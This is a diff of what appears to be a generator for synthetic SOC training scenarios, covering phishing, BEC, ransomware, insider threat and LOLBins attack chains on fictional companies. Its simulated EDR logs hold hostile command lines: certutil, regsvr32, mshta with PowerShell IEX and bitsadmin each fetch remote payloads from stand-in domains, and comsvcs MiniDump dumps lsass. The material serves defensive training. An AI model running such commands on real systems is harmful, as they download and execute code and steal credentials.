@@ -316,7 +316,6 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
         "authentication.protocol": "Kerberos",
         "authentication.status": "success",
         "logon.type": "2",
-        "logon.type_description": "Interactive (local console)",
       },
     },
     {
@@ -655,7 +654,6 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
         "process.target.pid": "704",
         "process.target.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe",
         "process.target.access_rights": "0x1FFFFF",
-        "process.target.access_rights_description": "PROCESS_ALL_ACCESS",
         // LOLBAS — comsvcs.dll
         "lolbas.name": "comsvcs.dll",
         "lolbas.function": "MiniDump",
@@ -796,7 +794,6 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
         // O365 Unified Audit Log — New-InboxRule
         "data.office365.Id": "a1b2c3d4-e5f6-7a8b-9c0d-e1f2a3b4c5d6",
         "data.office365.RecordType": "1",
-        "data.office365.RecordType_description": "ExchangeAdmin",
         "data.office365.CreationTime": "2026-05-08T10:20:00Z",
         "data.office365.Operation": "New-InboxRule",
         "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
@@ -804,7 +801,6 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
         "data.office365.UserId": "j.smith@cryotech.com",
         "data.office365.UserKey": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
         "data.office365.UserType": "0",
-        "data.office365.UserType_description": "Regular",
         "data.office365.ResultStatus": "True",
         "data.office365.ClientIP": attackerIp,
         "data.office365.SessionId": "b2c3d4e5-f6a1-b2c3-d4e5-f6a1b2c3d4e5",
@@ -1014,7 +1010,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
     { type: "email",   value: "support@cryotech-vendor.xyz",   reputation: "malicious",  tags: ["phishing", "sender"] },
     { type: "url",     value: `https://${c2Domain}/beacon`,    reputation: "malicious",  tags: ["c2", "beacon"] },
     { type: "user",    value: victim.email,                    reputation: "suspicious", tags: ["victim", "compromised"] },
-    { type: "host",    value: victim.hostname,                 reputation: "suspicious", tags: ["patient-zero"] },
+    { type: "host",    value: victim.hostname,                 reputation: "unknown", tags: ["patient-zero"] },
   ];
 
   const killchain = [
@@ -1120,9 +1116,7 @@ export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle 
         "winlog.event_data.TargetDomainName": "CRYOTECH",
         // Failure reason
         "winlog.event_data.Status": "0xC000006D",
-        "winlog.event_data.Status_description": "Unknown user name or bad password",
         "winlog.event_data.SubStatus": "0xC000006A",
-        "winlog.event_data.SubStatus_description": "Wrong password",
         "winlog.event_data.FailureReason": "%%2312",
         // Logon details
         "winlog.event_data.LogonType": "3",
@@ -1274,7 +1268,6 @@ export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle 
         // O365 Unified Audit Log — New-InboxRule
         "data.office365.Id": "b2c3d4e5-f6a1-b2c3-d4e5-f6a1b2c3d4e5",
         "data.office365.RecordType": "1",
-        "data.office365.RecordType_description": "ExchangeAdmin",
         "data.office365.CreationTime": "2026-05-08T08:13:00Z",
         "data.office365.Operation": "New-InboxRule",
         "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
@@ -1282,7 +1275,6 @@ export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle 
         "data.office365.UserId": "l.harris@cryotech.com",
         "data.office365.UserKey": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
         "data.office365.UserType": "0",
-        "data.office365.UserType_description": "Regular",
         "data.office365.ResultStatus": "True",
         "data.office365.ClientIP": attackerIp,
         "data.office365.SessionId": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
@@ -1312,7 +1304,6 @@ export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle 
         // O365 Unified Audit Log — MailItemsAccessed (ExchangeItemAggregated)
         "data.office365.Id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
         "data.office365.RecordType": "50",
-        "data.office365.RecordType_description": "ExchangeItemAggregated",
         "data.office365.CreationTime": "2026-05-08T08:15:00Z",
         "data.office365.Operation": "MailItemsAccessed",
         "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
@@ -1351,7 +1342,6 @@ export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle 
         // O365 Unified Audit Log — Set-Mailbox (ForwardingSmtpAddress)
         "data.office365.Id": "d4e5f6a1-b2c3-d4e5-f6a1-b2c3d4e5f6a1",
         "data.office365.RecordType": "1",
-        "data.office365.RecordType_description": "ExchangeAdmin",
         "data.office365.CreationTime": "2026-05-08T08:20:00Z",
         "data.office365.Operation": "Set-Mailbox",
         "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
@@ -1387,7 +1377,6 @@ export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle 
         // O365 Unified Audit Log — Send (ThreatIntelligence record type for BEC)
         "data.office365.Id": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
         "data.office365.RecordType": "28",
-        "data.office365.RecordType_description": "ThreatIntelligence",
         "data.office365.CreationTime": "2026-05-08T08:25:00Z",
         "data.office365.Operation": "Send",
         "data.office365.Workload": "Exchange",
@@ -1403,8 +1392,6 @@ export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle 
         "email.direction": "outbound",
         "email.size_bytes": "4217",
         // BEC enrichment fields
-        "bec.original_thread_subject": "Apex Supplies — Q2 invoice",
-        "bec.amount_usd": "247000",
         // ECS fields
         "event.action": "EmailSent",
         "event.outcome": "success",
@@ -1721,7 +1708,6 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
         "authentication.protocol": "Kerberos",
         "authentication.status": "success",
         "logon.type": "2",
-        "logon.type_description": "Interactive (local console)",
       },
     },
     {
@@ -1874,7 +1860,6 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
         "process.target.pid": "704",
         "process.target.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe",
         "process.target.access_rights": "0x1FFFFF",
-        "process.target.access_rights_description": "PROCESS_ALL_ACCESS",
         // LOLBAS — comsvcs.dll
         "lolbas.name": "comsvcs.dll",
         "lolbas.function": "MiniDump",
@@ -2200,8 +2185,8 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
     { type: "sha256", value: rswHash,                         reputation: "malicious",  tags: ["lockbit3", "ransomware"] },
     { type: "sha256", value: psxHash,                         reputation: "suspicious", tags: ["psexec", "lateral"] },
     { type: "email",  value: "payroll@cryotech-updates.net",  reputation: "malicious",  tags: ["phishing"] },
-    { type: "host",   value: zero.hostname,                   reputation: "suspicious", tags: ["patient-zero"] },
-    { type: "host",   value: server.hostname,                 reputation: "suspicious", tags: ["encrypted", "lateral-target"] },
+    { type: "host",   value: zero.hostname,                   reputation: "unknown", tags: ["patient-zero"] },
+    { type: "host",   value: server.hostname,                 reputation: "unknown", tags: ["encrypted", "lateral-target"] },
     { type: "user",   value: zero.email,                      reputation: "suspicious", tags: ["victim"] },
   ];
 
@@ -2402,7 +2387,6 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
         // O365 UAL + Entra ID Audit Log — Add application
         "data.office365.Id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f7",
         "data.office365.RecordType": "8",
-        "data.office365.RecordType_description": "AzureActiveDirectory",
         "data.office365.CreationTime": "2026-05-06T02:45:00Z",
         "data.office365.Operation": "Add application",
         "data.office365.Workload": "AzureActiveDirectory",
@@ -2444,7 +2428,6 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
         // O365 UAL + Entra ID Audit Log — Consent to application
         "data.office365.Id": "d4e5f6a1-b2c3-d4e5-f6a1-b2c3d4e5f6a2",
         "data.office365.RecordType": "8",
-        "data.office365.RecordType_description": "AzureActiveDirectory",
         "data.office365.CreationTime": "2026-05-06T02:46:00Z",
         "data.office365.Operation": "Consent to application",
         "data.office365.Workload": "AzureActiveDirectory",
@@ -2498,7 +2481,6 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
         // O365 UAL + Entra ID Audit Log — Reset user password (helpdesk action)
         "data.office365.Id": "f6a1b2c3-d4e5-f6a1-b2c3-d4e5f6a1b2c4",
         "data.office365.RecordType": "8",
-        "data.office365.RecordType_description": "AzureActiveDirectory",
         "data.office365.CreationTime": "2026-05-06T09:00:00Z",
         "data.office365.Operation": "Reset user password",
         "data.office365.Workload": "AzureActiveDirectory",
@@ -2833,7 +2815,6 @@ export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): 
         "authentication.protocol": "Kerberos",
         "authentication.status": "success",
         "logon.type": "2",
-        "logon.type_description": "Interactive (local console)",
         // HR enrichment (cross-referenced from HR system)
       },
     },
@@ -2985,7 +2966,7 @@ export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): 
         "event.action": "http_request", "event.outcome": "success",
         "user.email": "m.torres@cryotech.com",
         "source.ip": "10.10.20.91", "host.name": "WS-FIN-4421",
-        "url.domain": "indeed.com, linkedin.com/jobs, glassdoor.com",
+        "url.domain": "indeed.com",
         "url.category": "Job Search",
         "action_result": "allow",
       },
@@ -3057,10 +3038,6 @@ export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): 
         "event.action": "BehaviorAnomalyDetected",
         "event.outcome": "alerted",
         "user.email": insider.email,
-        "ueba.behavior_type": "MassDownloadActivity",
-        "ueba.anomaly_score": "89",
-        "ueba.time_window_minutes": "15",
-        "ueba.combined_risk": "critical",
         "alert.name": "MassDownloadActivity",
         "source.ip": insider.ip,
       },
@@ -3080,7 +3057,7 @@ export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): 
         "printer.name": "HP-FIN-FLOOR2",
         "printer.share": "\\\\PRINT-SRV-01\\HP-FIN-FLOOR2",
         "print.job_count": "3",
-        "print.file_names": "Headcount_Reduction_Plan_Nov26.xlsx, payroll-2026-Q2.xlsx, Employee_Salary_Master_2026.xlsx",
+        "print.file_name": "Headcount_Reduction_Plan_Nov26.xlsx",
         "print.pages": "47",
         "print.classification": "HRConfidential",
         "policy.name": "Endpoint-DLP-Print-Restricted-Content",
@@ -3093,7 +3070,7 @@ export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): 
   const alerts = eventsToAlerts(events, scenarioId);
   const iocs: IOC[] = [
     { type: "user",  value: insider.email,                    reputation: "suspicious", tags: ["insider", "pending-termination"] },
-    { type: "host",  value: insider.hostname,                 reputation: "suspicious", tags: ["exfil-workstation"] },
+    { type: "host",  value: insider.hostname,                 reputation: "unknown", tags: ["exfil-workstation"] },
     { type: "email", value: "m.torres.backup@gmail.com",      reputation: "suspicious", tags: ["personal-exfil-target"] },
   ];
 
@@ -3391,7 +3368,6 @@ export function buildImpossibleTravelScenario(scenarioId = "impossible-travel-20
         "gp.gateway":                      "gw-nexacorp-emea01",
         "gp.client_os":                    "Windows 10 1909",
         "gp.session_id":                   "gp-sess-4f7c9d2e",
-        "ueba.risk_score":                 "92",
       },
     },
 
@@ -3429,7 +3405,6 @@ export function buildImpossibleTravelScenario(scenarioId = "impossible-travel-20
         "event.action": "logged-in",
         "event.outcome": "success",
         "source.ip": nigIp,
-        "ueba.risk_score":                 "87",
       },
     },
 
@@ -3788,7 +3763,6 @@ export function buildUsbMalwareScenario(scenarioId = "usb-malware-basic-2026"): 
         "file.hash.sha256": fileHash,
         "file.signed": "false",
         "device.removable_media.serial": "07A3F9C1",
-        "device.removable_media.asset_tagged": "false",
         "user.name": "NEXACORP\\m.levi",
         "host.name": victim.hostname,
       },
@@ -5448,7 +5422,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
   const victimHost = "WS-HR-1133";
   const victimEmail = "s.patel@nexacorp.com";
   const victimIp = "10.10.20.77";
-  const payloadHash = makeSha256("evil_dll_nexacorp_lolbins");
+  const payloadHash = makeSha256("srvhost_dll_nexacorp_lolbins");
   const certutilHash = makeSha256("certutil_downloaded_update_exe");
   // certutil.exe is a signed Windows binary — it cannot share a hash with the
   // payload it fetched, and the platform teaches hash-based pivoting.
@@ -5519,16 +5493,16 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "high", mitre_technique: "T1105", mitre_tactic: "TA0011",
-      description: "certutil.exe, spawned from cmd.exe, downloaded update.exe from malicious-update.ru on WS-HR-1133.",
+      description: "certutil.exe, spawned from cmd.exe, downloaded update.exe from pkg-mirror-eu.ru on WS-HR-1133.",
       process: {
         name: "certutil.exe", pid: 4440, path: "C:\\Windows\\System32\\certutil.exe",
         parent_name: "cmd.exe", parent_pid: 4420,
-        cmdline: "certutil -urlcache -split -f http://malicious-update.ru/update.exe update.exe",
+        cmdline: "certutil -urlcache -split -f http://pkg-mirror-eu.ru/update.exe update.exe",
         user: "s.patel", integrity: "medium",
         hash: { sha256: certutilBinaryHash },
       },
       file: { name: "update.exe", path: "C:\\Users\\s.patel\\Downloads\\update.exe", sha256: certutilHash, size: 204800 },
-      network: { url: "http://malicious-update.ru/update.exe", domain: "malicious-update.ru", bytes_out: 204800 },
+      network: { url: "http://pkg-mirror-eu.ru/update.exe", domain: "pkg-mirror-eu.ru", bytes_out: 204800 },
       raw: {
         "event.provider": "Microsoft Defender ATP",
         "event.dataset": "DeviceProcessEvents",
@@ -5538,7 +5512,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "ActionType": "ProcessCreated",
         "FileName": "certutil.exe",
         "FolderPath": "C:\\Windows\\System32\\certutil.exe",
-        "ProcessCommandLine": "certutil -urlcache -split -f http://malicious-update.ru/update.exe update.exe",
+        "ProcessCommandLine": "certutil -urlcache -split -f http://pkg-mirror-eu.ru/update.exe update.exe",
         "InitiatingProcessFileName": "cmd.exe",
         "InitiatingProcessFolderPath": "C:\\Windows\\System32\\cmd.exe",
         "InitiatingProcessAccountName": "s.patel",
@@ -5547,7 +5521,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "SHA256": certutilBinaryHash,
         "AccountName": "s.patel",
         "AccountDomain": "NEXACORP",
-        "RemoteUrl": "malicious-update.ru",
+        "RemoteUrl": "pkg-mirror-eu.ru",
         "RemoteIP": "91.108.56.207",
         "RemotePort": "80",
         "ReportId": "9284512",
@@ -5562,15 +5536,15 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "critical", mitre_technique: "T1218.010", mitre_tactic: "TA0005",
-      description: "regsvr32.exe ran with /i:http://attacker.com/payload.sct, loading a COM scriptlet from a remote URL.",
+      description: "regsvr32.exe ran with /i:http://cdn-winupd.ru/payload.sct, loading a COM scriptlet from a remote URL.",
       process: {
         name: "regsvr32.exe", pid: 5512, path: "C:\\Windows\\System32\\regsvr32.exe",
         parent_name: "cmd.exe", parent_pid: 4420,
-        cmdline: "regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll",
+        cmdline: "regsvr32 /s /u /i:http://cdn-winupd.ru/payload.sct scrobj.dll",
         user: "s.patel", integrity: "medium",
         hash: { sha256: makeSha256("regsvr32_system_binary") },
       },
-      network: { url: "http://attacker.com/payload.sct", domain: "attacker.com", bytes_out: 8192 },
+      network: { url: "http://cdn-winupd.ru/payload.sct", domain: "cdn-winupd.ru", bytes_out: 8192 },
       raw: {
         "event.provider": "Microsoft Defender ATP",
         "event.dataset": "DeviceProcessEvents",
@@ -5580,7 +5554,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "ActionType": "ProcessCreated",
         "FileName": "regsvr32.exe",
         "FolderPath": "C:\\Windows\\System32\\regsvr32.exe",
-        "ProcessCommandLine": "regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll",
+        "ProcessCommandLine": "regsvr32 /s /u /i:http://cdn-winupd.ru/payload.sct scrobj.dll",
         "InitiatingProcessFileName": "cmd.exe",
         "InitiatingProcessFolderPath": "C:\\Windows\\System32\\cmd.exe",
         "InitiatingProcessAccountName": "s.patel",
@@ -5589,7 +5563,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "SHA256": makeSha256("regsvr32_system_binary"),
         "AccountName": "s.patel",
         "AccountDomain": "NEXACORP",
-        "RemoteUrl": "attacker.com",
+        "RemoteUrl": "cdn-winupd.ru",
         "RemoteIP": "185.220.101.55",
         "RemotePort": "80",
         "ReportId": "9284556",
@@ -5604,15 +5578,15 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "critical", mitre_technique: "T1218.005", mitre_tactic: "TA0005",
-      description: "mshta.exe, spawned by regsvr32.exe, ran a VBScript that launched hidden PowerShell to fetch stage2.ps1 from attacker.com.",
+      description: "mshta.exe, spawned by regsvr32.exe, ran a VBScript that launched hidden PowerShell to fetch stage2.ps1 from cdn-winupd.ru.",
       process: {
         name: "mshta.exe", pid: 6100, path: "C:\\Windows\\System32\\mshta.exe",
         parent_name: "regsvr32.exe", parent_pid: 5512,
-        cmdline: "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')\"\",0:close\")",
+        cmdline: "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-winupd.ru/stage2.ps1')\"\",0:close\")",
         user: "s.patel", integrity: "medium",
         hash: { sha256: makeSha256("mshta_exe_system_binary") },
       },
-      network: { url: "http://attacker.com/stage2.ps1", domain: "attacker.com", bytes_out: 12288 },
+      network: { url: "http://cdn-winupd.ru/stage2.ps1", domain: "cdn-winupd.ru", bytes_out: 12288 },
       raw: {
         "event.provider": "Microsoft Defender ATP",
         "event.dataset": "DeviceProcessEvents",
@@ -5631,7 +5605,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "SHA256": makeSha256("mshta_exe_system_binary"),
         "AccountName": "s.patel",
         "AccountDomain": "NEXACORP",
-        "RemoteUrl": "attacker.com",
+        "RemoteUrl": "cdn-winupd.ru",
         "RemoteIP": "185.220.101.55",
         "ReportId": "9284601",
         "host.name": victimHost,
@@ -5649,11 +5623,11 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       process: {
         name: "powershell.exe", pid: 6200, path: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         parent_name: "mshta.exe", parent_pid: 6100,
-        cmdline: "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')",
+        cmdline: "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-winupd.ru/stage2.ps1')",
         user: "s.patel", integrity: "medium",
         hash: { sha256: makeSha256("powershell_exe_system_binary") },
       },
-      network: { url: "http://attacker.com/stage2.ps1", domain: "attacker.com", bytes_in: 12288 },
+      network: { url: "http://cdn-winupd.ru/stage2.ps1", domain: "cdn-winupd.ru", bytes_in: 12288 },
       raw: {
         "event.provider": "Microsoft Defender ATP",
         "event.dataset": "DeviceProcessEvents",
@@ -5663,13 +5637,13 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "FileName": "powershell.exe",
         "FolderPath": "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "ProcessId": "6200",
-        "ProcessCommandLine": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')",
+        "ProcessCommandLine": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-winupd.ru/stage2.ps1')",
         "InitiatingProcessFileName": "mshta.exe",
         "InitiatingProcessId": "6100",
         "AccountName": "s.patel",
         "AccountDomain": "NEXACORP",
         "ProcessIntegrityLevel": "Medium",
-        "RemoteUrl": "attacker.com",
+        "RemoteUrl": "cdn-winupd.ru",
       },
     },
     {
@@ -5715,16 +5689,16 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "high", mitre_technique: "T1197", mitre_tactic: "TA0003",
-      description: "bitsadmin.exe created a BITS job named NexaCorpUpdate that downloads svchost_update.exe from attacker.com to C:\\ProgramData\\nexacorp\\.",
+      description: "bitsadmin.exe created a BITS job named NexaCorpUpdate that downloads svchost_update.exe from cdn-winupd.ru to C:\\ProgramData\\nexacorp\\.",
       process: {
         name: "bitsadmin.exe", pid: 7002, path: "C:\\Windows\\System32\\bitsadmin.exe",
         parent_name: "powershell.exe", parent_pid: 6200,
-        cmdline: "bitsadmin /transfer NexaCorpUpdate /download /priority normal http://attacker.com/persistence.exe C:\\ProgramData\\nexacorp\\svchost_update.exe",
+        cmdline: "bitsadmin /transfer NexaCorpUpdate /download /priority normal http://cdn-winupd.ru/persistence.exe C:\\ProgramData\\nexacorp\\svchost_update.exe",
         user: "s.patel", integrity: "medium",
         hash: { sha256: makeSha256("bitsadmin_system_binary") },
       },
       file: { name: "svchost_update.exe", path: "C:\\ProgramData\\nexacorp\\svchost_update.exe", sha256: bitsPayloadHash, size: 307200 },
-      network: { url: "http://attacker.com/persistence.exe", domain: "attacker.com", bytes_out: 307200 },
+      network: { url: "http://cdn-winupd.ru/persistence.exe", domain: "cdn-winupd.ru", bytes_out: 307200 },
       raw: {
         "event.provider": "Microsoft Defender ATP",
         "event.dataset": "DeviceProcessEvents",
@@ -5734,7 +5708,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "ActionType": "ProcessCreated",
         "FileName": "bitsadmin.exe",
         "FolderPath": "C:\\Windows\\System32\\bitsadmin.exe",
-        "ProcessCommandLine": "bitsadmin /transfer NexaCorpUpdate /download /priority normal http://attacker.com/persistence.exe C:\\ProgramData\\nexacorp\\svchost_update.exe",
+        "ProcessCommandLine": "bitsadmin /transfer NexaCorpUpdate /download /priority normal http://cdn-winupd.ru/persistence.exe C:\\ProgramData\\nexacorp\\svchost_update.exe",
         "InitiatingProcessFileName": "powershell.exe",
         "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "InitiatingProcessAccountName": "s.patel",
@@ -5743,7 +5717,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "SHA256": makeSha256("bitsadmin_system_binary"),
         "AccountName": "s.patel",
         "AccountDomain": "NEXACORP",
-        "RemoteUrl": "attacker.com",
+        "RemoteUrl": "cdn-winupd.ru",
         "RemoteIP": "185.220.101.55",
         "ReportId": "9284702",
         "host.name": victimHost,
@@ -5757,11 +5731,11 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "critical", mitre_technique: "T1218.011", mitre_tactic: "TA0005",
-      description: "rundll32.exe loaded an unsigned DLL (evil.dll) from C:\\Users\\Public, calling its DllMain export directly.",
+      description: "rundll32.exe loaded an unsigned DLL (srvhost.dll) from C:\\Users\\Public, calling its DllMain export directly.",
       process: {
         name: "rundll32.exe", pid: 7480, path: "C:\\Windows\\System32\\rundll32.exe",
         parent_name: "powershell.exe", parent_pid: 6200,
-        cmdline: "rundll32.exe C:\\Users\\Public\\evil.dll,DllMain",
+        cmdline: "rundll32.exe C:\\Users\\Public\\srvhost.dll,DllMain",
         user: "s.patel", integrity: "medium",
         // The PROCESS here is rundll32.exe, a signed Microsoft binary. The
         // payload is the DLL it loads, in the `file` block below, which keeps
@@ -5769,7 +5743,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         // student pivoting on SHA256 that rundll32.exe itself is malware.
         hash: { sha256: rundll32BinaryHash },
       },
-      file: { name: "evil.dll", path: "C:\\Users\\Public\\evil.dll", sha256: payloadHash, size: 204800, extension: ".dll" },
+      file: { name: "srvhost.dll", path: "C:\\Users\\Public\\srvhost.dll", sha256: payloadHash, size: 204800, extension: ".dll" },
       raw: {
         "event.provider": "Microsoft Defender ATP",
         "event.dataset": "DeviceProcessEvents",
@@ -5779,7 +5753,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "ActionType": "ProcessCreated",
         "FileName": "rundll32.exe",
         "FolderPath": "C:\\Windows\\System32\\rundll32.exe",
-        "ProcessCommandLine": "rundll32.exe C:\\Users\\Public\\evil.dll,DllMain",
+        "ProcessCommandLine": "rundll32.exe C:\\Users\\Public\\srvhost.dll,DllMain",
         "InitiatingProcessFileName": "powershell.exe",
         "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "InitiatingProcessAccountName": "s.patel",
@@ -5788,7 +5762,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "SHA256": rundll32BinaryHash,
         "AccountName": "s.patel",
         "AccountDomain": "NEXACORP",
-        "FileOriginUrl": "C:\\Users\\Public\\evil.dll",
+        "FileOriginUrl": "C:\\Users\\Public\\srvhost.dll",
         "IsFileSigned": "false",
         "ReportId": "9284755",
         "host.name": victimHost,
@@ -5865,13 +5839,13 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       mitre_technique: "T1105",
       src_ip: victimIp, dst_port: 80,
       hostname: victimHost,
-      description: "WS-HR-1133 opened an outbound HTTP session to malicious-update.ru (91.108.56.207:80), allowed by rule ALLOW-OUTBOUND-HTTP.",
+      description: "WS-HR-1133 opened an outbound HTTP session to pkg-mirror-eu.ru (91.108.56.207:80), allowed by rule ALLOW-OUTBOUND-HTTP.",
       raw: {
         "event.action": "allow",
         "source.ip": victimIp,
         "destination.ip": "91.108.56.207",
         "destination.port": "80",
-        "destination.host": "malicious-update.ru",
+        "destination.host": "pkg-mirror-eu.ru",
         "pan.app": "web-browsing",
         "pan.action": "allow",
         "pan.rule": "ALLOW-OUTBOUND-HTTP",
@@ -5908,17 +5882,17 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       mitre_technique: "T1218.010",
       src_ip: victimIp, dst_port: 80,
       hostname: victimHost,
-      description: "WS-HR-1133 fetched http://attacker.com/payload.sct from 185.220.101.55:80, allowed by rule ALLOW-OUTBOUND-HTTP.",
+      description: "WS-HR-1133 fetched http://cdn-winupd.ru/payload.sct from 185.220.101.55:80, allowed by rule ALLOW-OUTBOUND-HTTP.",
       raw: {
         "event.action": "allow",
         "source.ip": victimIp,
         "destination.ip": "185.220.101.55",
         "destination.port": "80",
-        "destination.host": "attacker.com",
+        "destination.host": "cdn-winupd.ru",
         "pan.app": "web-browsing",
         "pan.action": "allow",
         "pan.rule": "ALLOW-OUTBOUND-HTTP",
-        "url.full": "http://attacker.com/payload.sct",
+        "url.full": "http://cdn-winupd.ru/payload.sct",
         "url.category": "Unknown/Uncategorized",
         "network.bytes_in": "8192",
       },
@@ -5926,13 +5900,13 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
   ];
 
   const iocs: IOC[] = [
-    { type: "domain", value: "malicious-update.ru",                                  reputation: "malicious", tags: ["c2-domain", "certutil-download-source"] },
-    { type: "domain", value: "attacker.com",                                          reputation: "malicious", tags: ["c2-domain", "regsvr32-sct", "bitsadmin-download"] },
-    { type: "sha256", value: payloadHash,                                             reputation: "malicious", tags: ["lolbins-payload", "evil-dll", "persistence-binary"] },
+    { type: "domain", value: "pkg-mirror-eu.ru",                                  reputation: "malicious", tags: ["c2-domain", "certutil-download-source"] },
+    { type: "domain", value: "cdn-winupd.ru",                                          reputation: "malicious", tags: ["c2-domain", "regsvr32-sct", "bitsadmin-download"] },
+    { type: "sha256", value: payloadHash,                                             reputation: "malicious", tags: ["lolbins-payload", "dropped-module", "persistence-binary"] },
     { type: "sha256", value: certutilHash,                                            reputation: "malicious", tags: ["certutil-downloaded-payload"] },
     { type: "ip",     value: "185.220.101.55",                                        reputation: "malicious", tags: ["attacker-c2-ip", "regsvr32-sct-server", "bitsadmin-server"] },
-    { type: "url",    value: "http://malicious-update.ru/update.exe",                 reputation: "malicious", tags: ["lolbin-download-url"] },
-    { type: "url",    value: "http://attacker.com/payload.sct",                       reputation: "malicious", tags: ["squiblydoo-sct-url"] },
+    { type: "url",    value: "http://pkg-mirror-eu.ru/update.exe",                 reputation: "malicious", tags: ["lolbin-download-url"] },
+    { type: "url",    value: "http://cdn-winupd.ru/payload.sct",                       reputation: "malicious", tags: ["squiblydoo-sct-url"] },
   ];
 
   return {
@@ -5954,7 +5928,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
